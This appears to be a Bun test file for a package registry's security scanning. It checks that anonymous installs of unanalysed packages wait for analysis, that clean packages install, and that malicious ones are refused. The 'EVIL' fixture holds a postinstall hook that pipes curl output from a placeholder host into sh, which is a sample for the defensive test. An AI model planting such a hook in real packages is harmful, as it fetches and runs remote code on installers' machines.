// Review of d49bf6e, finding 4, end to end: an anonymous request only queues analyses, so a cold package used to be
// refused at once by `apm add`, and a cold malicious dependency of a scored root installed with no block. Now the
// registry waits for the queue (the Worker's analysis queue, simulated by Miniflare) and the install paths wait for the
// registry, so a cold clean package installs after a short wait, and a cold malicious one, or a root that pulls one in,
// is refused, never installed as clean. A second in-process registry stands in for npm; nothing here signs in.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { cpSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { addUser, apm, installedVersion, makeSandbox, ROOT, run, startRegistry, writeConsumer, writePackage, writeProjectConfig, type Registry } from "./harness";

const DAY = 24 * 60 * 60 * 1000;
let clock = Date.parse("2026-08-01T00:00:00Z");
let upstream: Registry;
let reg: Registry;
let upAlice: string;
let work: string;

const EVIL = { scripts: { postinstall: "node i.js" }, files: { "index.js": "module.exports=1;\n", "i.js": "require('child_process').execSync('curl https://e.example.com/x.sh | sh');\n" } };

async function publishTo(r: Registry, token: string, name: string, extra: Partial<Parameters<typeof writePackage>[1]> = {}): Promise<void> {
  const sb = makeSandbox(r, token);
  const d = writePackage(work, { name, version: "1.0.0", ...extra }, r, token);
  const p = await run(["bun", "publish"], { cwd: d, env: sb.env });

  if (p.code !== 0) throw new Error(`publish ${name} failed: ${p.out}`);
}

/** How long each install took, printed for the report. */
function timed(label: string, ms: number): void {
  process.stdout.write(`[cold-install] ${label}: ${(ms / 1000).toFixed(1)} s\n`);
}

beforeAll(async () => {
  upstream = await startRegistry({ now: () => clock });
  upAlice = await addUser(upstream, "upalice", "correct-horse-battery");
  work = mkdtempSync(join(tmpdir(), "apm-cold-"));

  for (const name of ["cold-ok", "cold-bun-ok"]) await publishTo(upstream, upAlice, name);

  for (const name of ["cold-evil", "cold-bun-evil"]) await publishTo(upstream, upAlice, name, EVIL);
  await publishTo(upstream, upAlice, "cold-root", { dependencies: { "cold-evil": "^1.0.0" } });
  reg = await startRegistry({ now: () => clock, upstream: upstream.url });

  // the scanner, published to apm itself, as bun-scanner.test.ts does
  const apmUser = await addUser(reg, "apm");
  const dst = mkdtempSync(join(work, "scanner-"));

  cpSync(join(ROOT, "packages", "bun-scanner"), dst, { recursive: true, filter: (p) => !p.includes("node_modules") && !p.includes("/test") });
  const pj: unknown = JSON.parse(readFileSync(join(dst, "package.json"), "utf8"));

  writeFileSync(join(dst, "package.json"), JSON.stringify({ ...Object(pj), private: false, publishConfig: { access: "public" } }, null, 2));
  writeProjectConfig(dst, reg, apmUser);
  const p = await run(["bun", "publish"], { cwd: dst, env: makeSandbox(reg, apmUser).env });

  if (p.code !== 0) throw new Error(`scanner publish failed: ${p.out}`);
  clock += 10 * DAY;
});

afterAll(async () => {
  await reg?.stop();
  await upstream?.stop();
});

/** An anonymous project: no token anywhere, so the registry analyses nothing inline. */
function anonymousApp(scanner: boolean) {
  const sb = makeSandbox(reg);
  const app = writeConsumer(work, reg, undefined, {});

  if (scanner) writeFileSync(join(app, "bunfig.toml"), `[install]\nregistry = "${reg.url}"\n\n[install.security]\nscanner = "@apm/bun-scanner"\n`);

  return { app, env: sb.env };
}

describe("cold packages, anonymous installs", () => {
  test("apm add of a cold clean package waits for its analysis and installs it", async () => {
    const { app, env } = anonymousApp(false);
    const t0 = performance.now();
    const r = await apm(["add", "cold-ok"], { cwd: app, env, timeoutMs: 120_000 });

    timed("apm add cold-ok (cold, clean)", performance.now() - t0);
    expect(r.code, r.out).toBe(0);
    expect(installedVersion(app, "cold-ok")).toBe("1.0.0");
  }, 150_000);

  test("apm add of a cold root that pulls in a cold malicious dependency is refused", async () => {
    const { app, env } = anonymousApp(false);
    const t0 = performance.now();
    const r = await apm(["add", "cold-root"], { cwd: app, env, timeoutMs: 120_000 });

    timed("apm add cold-root (cold, malicious dependency)", performance.now() - t0);
    expect(r.code).not.toBe(0);
    expect(r.out).toContain("cold-evil");
    expect(installedVersion(app, "cold-root")).toBeNull();
    expect(installedVersion(app, "cold-evil")).toBeNull();
  }, 150_000);

  test("bun add with the scanner: a cold clean package installs, a cold malicious one is cancelled", async () => {
    const { app, env } = anonymousApp(true);
    const s = await run(["bun", "add", "-d", "@apm/bun-scanner"], { cwd: app, env });

    expect(s.code, s.out).toBe(0);
    const t0 = performance.now();
    const ok = await run(["bun", "add", "cold-bun-ok"], { cwd: app, env, timeoutMs: 120_000 });

    timed("bun add cold-bun-ok (cold, clean, scanner)", performance.now() - t0);
    expect(ok.code, ok.out).toBe(0);
    expect(installedVersion(app, "cold-bun-ok")).toBe("1.0.0");
    const t1 = performance.now();
    const bad = await run(["bun", "add", "cold-bun-evil"], { cwd: app, env, timeoutMs: 120_000 });

    timed("bun add cold-bun-evil (cold, malicious, scanner)", performance.now() - t1);
    expect(bad.code).not.toBe(0);
    expect(bad.out).toContain("cold-bun-evil");
    expect(installedVersion(app, "cold-bun-evil")).toBeNull();
  }, 300_000);
});
